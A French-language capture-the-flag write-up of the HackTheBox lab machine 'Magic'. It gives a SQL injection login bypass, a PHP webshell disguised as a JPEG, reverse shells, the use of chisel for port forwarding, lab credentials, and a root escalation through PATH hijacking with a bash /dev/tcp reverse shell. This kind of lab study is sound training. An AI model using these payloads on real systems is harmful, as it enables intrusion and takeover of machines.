---
title: HTB | Magic
description: Magic is an easy difficulty Linux machine that features a custom web application. A SQL injection vulnerability in the login form is exploited, in order to bypass the login and gain access to an upload page. Weak whitelist validation allows for uploading a PHP webshell, which is used to gain command execution. The MySQL database is found to contain plaintext credentials, which are re-used for lateral movement. A path hijacking vector combined with assigned SUID permissions leads to full system compromise.
slug: magic-htb
date: 2025-07-24 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Medium
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Magic cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Magic</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.185</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Medium</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
## mysql
theseus : `iamkingtheseus`

admin : `Th3s3usW4sK1ng`
```

## Enumeration

### nmap
```bash
$ nmap -sC -sV -An -T4 -vvv -p- 10.10.10.185
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06d489bf51f7fc0cf9085e9763648dca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX
|   256 11a69298ce3540c729094f6c2d74aa66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ=
|   256 7105991fa81b14d6038553f8788ecb88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

## Foothold

### Website : login page
On trouve un site internet sur le port 80 avec une page de login. Le site nous indique la possibilité d'upload des images. Après avoir testé plusieurs combinaisons de credentials (ex: admin/admin, root/root...), on trouve une injection SQL qui nous permet de nous connecter
```bash
user:     aaaa' or 1=1;--
password: aaaa' or 1=1;--
```
En utilisant cela comme **user** et **password**, on obtient un accès à la page **upload.php**.

### Upload image : Exploit Magic Byte
On peut uploader des images avec du code **php** à l'intérieur. Pour que le code php soit executé et que le fichier soit uploadé, il a fallu :
- Changer le magic byte par celui d'une image XXX :
- Modifier l'extension en ".php.jpg" (ou ".php.png")

En une seule ligne de code, cela nous donne :
```bash
echo -ne '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell_magic.php.jpg
```
On peut alors executer du code php sur la machine en utilisant le paramètre **cmd** :
> http://10.10.10.185/images/uploads/shell_magic.php.jpg?cmd=id

Pourquoi cela fonctionne ?
- Le serveur vérifie l'extension du fichier. Ici, la dernière extension est bien ".jpg", notre fichier passe le 1er test.
- Ensuite, le serveur vérifie le magic byte, il s'agit de plusieurs octets ecrit au début du fichier précisant le type : JPG, GIF, PHP. Il suffit donc de placer le magic byte d'une image PNG ou JPG pour passer cette deuxième couche de protection.

Pourquoi le code php est executé ?
Apache traite toutes les extensions dans un nom de fichier et s’arrête à la **première extension** qu’il reconnaît comme "exécutable" (comme .php), même si elle n’est pas la dernière. D'où l'importance d'écrire ".php.jpg". Si on place seulement ".jpg", le serveur apache interpretera le fichier comme une image et le code ne sera pas executé.

En utilisant le reverse shell php "pentest monkey", on obtient facilement un shell sur la machine :
```bash
nc -lnvp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.185.
Ncat: Connection from 10.10.10.185:51964.
Linux magic 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 06:41:39 up 19:17,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1197): Inappropriate ioctl for device
bash: no job control in this shell
www-data@magic:/$ export TERM=xterm
export TERM=xterm
www-data@magic:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@magic:/$ ^Z
[1]  + 9828 suspended  nc -lnvp 9001
$ stty raw -echo;fg                                               
[1]  + 9828 continued  nc -lnvp 9001

www-data@magic:/$ whoami
www-data
```

### mysql creds : db.php5
On trouve un fichier de base de donnée avec db.php5
```bash
www-data@magic:/var/www/Magic$ cat db.php5 
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
...
```

### Mysql connection (chisel port forwarding) : admin creds
On remarque que le port mysql est bien ouvert (3306), cependant, l'outil **mysql** n'est pas installé et on ne peut pas se connecter à la base de donnée :
```bash
www-data@magic:/var/www/Magic$ ss -lntp
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
...   
www-data@magic:/var/www/Magic$ mysql

Command 'mysql' not found, but can be installed with:
...
```
Pour contourner cela, j'ai décidé d'utiliser **chisel** pour faire du **port forwarding**. Le but étant d'accéder au port 3306 du serveur depuis ma machine hôte. Pour faire cela, il suffit de telecharger le binaire chisel sur la page github. Voici les commandes à effectuer:
```bash
www-data@magic:/var/www/Magic$ wget http://10.10.16.2/chisel
--2025-07-24 07:00:58--  http://10.10.16.2/chisel
Connecting to 10.10.16.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9371800 (8.9M) [application/octet-stream]
Saving to: 'chisel'

chisel             100%[===================>]   8.94M   336KB/s    in 26s     

2025-07-24 07:01:25 (351 KB/s) - 'chisel' saved [9371800/9371800]

3306data@magic:/var/www/Magic$ ./chisel client 10.10.16.2:1082 R:3306:localhost:3306 > /dev/null 2> /dev/null &
[1] 5146
....

-----------------------

$ ./chisel server -p 1082 --reverse
2025/07/24 16:02:12 server: Reverse tunnelling enabled
2025/07/24 16:02:12 server: Fingerprint 4PDYwTjgAniyianMIlBvt3QRTZm4VpYL+kFf1nXfQPg=
2025/07/24 16:02:12 server: Listening on http://0.0.0.0:1082
2025/07/24 16:03:19 server: session#1: tun: proxy#R:3306=>localhost:3306: Listening
```

Depuis ma machine hôte, j'utilise la commande **mysql** pour me connecter a mon port local 3306 qui est forward vers le port 3306 du serveur. On trouve alors une database "Magic" et une table "login" contenant les credentials suivants:
admin : `Th3s3usW4sK1ng`

```bash
$ mysql -h 127.0.0.1 -P 3306 -u theseus -p                
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 25
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Magic              |
+--------------------+
2 rows in set (0.145 sec)

MySQL [(none)]> use Magic;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [Magic]> show tables;
+-----------------+
| Tables_in_Magic |
+-----------------+
| login           |
+-----------------+
1 row in set (0.136 sec)

MySQL [Magic]> select * from login;
+----+----------+----------------+
| id | username | password       |
+----+----------+----------------+
|  1 | admin    | Th3s3usW4sK1ng |
+----+----------+----------------+
1 row in set (0.106 sec)
```

### theseus user : su
On se connecte en tant que **theseus** avec le mot de passe trouvé précédemment. Cependant, ssh ne fonctionne qu'avec une paire de clé publique.
```bash
www-data@magic:/var/www/Magic$ su theseus
Password: <---- Th3s3usW4sK1ng
theseus@magic:/var/www/Magic$ cat /home/theseus/user.txt 
6553.....4c7a
```

### SSH : theseus
Pour obtenir un shell plus stable, j'ai généré une paire de clé **RSA** et j'ai ajouté la clé publique dans le fichier **authorized_keys**. Ensuite il suffit de copier le clé privé et de la mettre sur ma machine hôte, puis d'effectuer une connexion ssh :
```bash
theseus@magic:~$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/theseus/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/theseus/.ssh/id_rsa.
Your public key has been saved in /home/theseus/.ssh/id_rsa.pub.
...
theseus@magic:~$ cd .ssh
theseus@magic:~/.ssh$ cat id_rsa.pub > authorized_keys
theseus@magic:~/.ssh$ cat id_rsa
...
## [Ctrl-C, Ctrl-V] --> copie de la clé privée sur la machine hôte

-------------------------

$ vim theseus.key
...
$ chmod 600 theseus.key
$ ssh theseus@10.10.10.185 -i theseus.key
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-42-generic x86_64)
...
theseus@magic:~$ whoami
theseus
```

## Privilege Escalation

### SUID binary : /bin/sysinfo
On découvre que le binaire "/bin/sysinfo" a le bit SUID activé, grâce à l'énumeration avec **linpeas**.
```bash
theseus@magic:~$ cat linpeas.out | grep -i SUID

╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
...
-rwsr-x--- 1 root users 22K Oct 21  2019 /bin/sysinfo (Unknown SUID binary!)
...
```

### fdisk execution in /bin/sysinfo
Pour faire une attaque "PATH injection" sur le binaire **SUID**, j'ai pu utiliser strace, ltrace ou encore **strings**:
```bash
theseus@magic:~/bin$ strings /bin/sysinfo | less
/lib64/ld-linux-x86-64.so.2
libstdc++.so.6
__gmon_start__
_ITM_deregisterTMCloneTable
...
...
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
...
```
On observe l'execution de lshw, fdisk ou encore cat, sans le path absolu. Ex: /bin/cat. On peut donc faire une PATH injection. J'ai choisi de le faire avec fdisk.

### Creating fake "fdisk" binary with reverse shell

On crée un faux binaire **fdisk** dans le dossier **bin/** qu'on ajoute ensuite au **PATH** :
```bash
theseus@magic:~$ mkdir bin;cd bin
theseus@magic:~/bin$ nano fdisk
##!/bin/bash
bash -i >& /dev/tcp/10.10.16.2/1337 0>&1
theseus@magic:~/bin$ export PATH="/home/theseus/bin:$PATH"
```

### Root shell using PATH injection
On execute ensuite le binaire /bin/sysinfo, qui va executer la commande **fdisk** en tant que root. Comme mon dossier **bin** contient aussi un binaire fdisk, ET qu'il est en en premier dans la liste des dossiers du PATH, alors le programme va décider de l'executer à la place du véritable binaire :

```bash
theseus@magic:~/bin$ /bin/sysinfo 
====================Hardware Info====================
H/W path           Device     Class      Description
====================================================
                              system     VMware Virtual Platform
/0                            bus        440BX Desktop Reference Platform
/0/0                          memory     86KiB BIOS
/0/1                          processor  AMD EPYC 7763 64-Core Processor
/0/1/0                        memory     16KiB L1 cache
/0/1/1                        memory     16KiB L1 cache
/0/1/2                        memory     512KiB L2 cache
/0/1/3                        memory     512KiB L2 cache
...

====================Disk Info====================

------------------------------

$ nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.185.
Ncat: Connection from 10.10.10.185:48804.
root@magic:~/bin# whoami
root
root@magic:~# cd /root
root@magic:/root# cat root.txt
c21a.....fa6b
```